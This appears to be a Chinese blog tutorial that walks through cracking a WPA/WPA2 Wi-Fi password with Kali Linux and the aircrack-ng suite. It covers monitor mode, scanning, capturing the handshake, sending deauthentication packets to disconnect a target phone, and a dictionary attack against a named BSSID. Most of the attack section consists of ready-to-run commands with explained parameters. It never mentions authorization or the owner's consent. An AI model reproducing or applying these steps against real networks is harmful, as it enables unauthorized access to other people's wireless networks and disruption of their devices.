前期准备
1.kali Linux操作系统，我这里是在U盘里面预先安装了64位的kali系统，装在U盘的好处就是随时随地插在其他电脑都可以用，若要在U盘装kali，U盘大小容量最好准备在32G以上
2.支持监听模式的网卡，我这里使用的是笔记本内置的无线网卡Qualcomm Atheros QCA9565
3.字典文件，我这里使用的是kali默认的字典文件
###一、检查
先输入airmon-ng命令检查网卡是否支持监听模式
![image.png](https://upload-images.jianshu.io/upload_images/15873283-69855780d18c67b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
###二、开启网卡监听模式
接着启动网卡的监听（monitor）模式
airmon-ng start wlan0
![image.png](https://upload-images.jianshu.io/upload_images/15873283-5bb01c350c40748f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
输入iwconfig确认一遍，确认已进入monitor模式
开启监听模式（monitor）后，wlan0会变成wlan0mon，可使用ifconfig查看

###三、搜索周围网络
命令 airodump-ng wlan0mon 搜索周围的网路
![image.png](https://upload-images.jianshu.io/upload_images/15873283-2e895b939cc63007.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
使用airodump-ng命令可列出无线网卡扫描到的WiFi热点详细信息，包括信号强度、加密类型、信道等，这里我们要记一下要破解的WiFi的bssid和信道。当搜索到我们要破解的WiFi热点时可以Ctrl+C停止搜索。
###四、抓取握手包
使用网卡的监听模式抓取周围的无线网络数据包，其中我们需要用到的数据包是包含了WiFi密码的握手包，当有新用户连接WiFi时会发送握手包。
抓包：
airodump-ng -c 1 --bssid E4:F3:F5:17:86:F4 -w ~/ wlan0mon
参数解释：
-c指定信道，目标热点的WiFi信道
-bssid 指定目标路由器的bssid
-w 指定抓取的数据包保持的目录
![image.png](https://upload-images.jianshu.io/upload_images/15873283-5dd0e498d6c742e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
###五、强制连接到WiFi的设备重连路由器
现在我们使用aireplay-ng命令给手机发送一个反认证包，使手机强制断开连接，随后它会自动再次连接WiFi。
可以看出，aireplay-ng生效的前提是WiFi热点中必须至少有一个设备已经接入。
由于刚刚打开的终端一直在执行抓包工作，所以我们重新打开一个终端，输入命令：
aireplay-ng -0 2 -a E4:F3:F5:17:86:F4 -c A8:0C:63:C8:81:19 wlan0mon
-a 指定WiFi热点的bssid
-c 指定要攻击的设备MAC地址
![image.png](https://upload-images.jianshu.io/upload_images/15873283-c3801f93c8b8a496.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
此刻我们已经成功抓到了握手包，如下图（红色标记代表已经获取到了握手包）
###六、破解
上面已经成功抓取到了握手包，现在要做的工作就是将握手包的密码和字典中的密码进行匹配。
这里我们直接用系统自带的默认字典破解。
aircrack-ng -a2 -b E4:F3:F5:17:86:F4 -w /usr/share/wordlists/rockyou.txt ~/*.cap
参数解释：
-a2 代表WPA/WPA2的握手包
-b 指定要破解的wifi BSSID
-w 指定字典文件
最后是抓取的包
![image.png](https://upload-images.jianshu.io/upload_images/15873283-c4031fcb685690b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

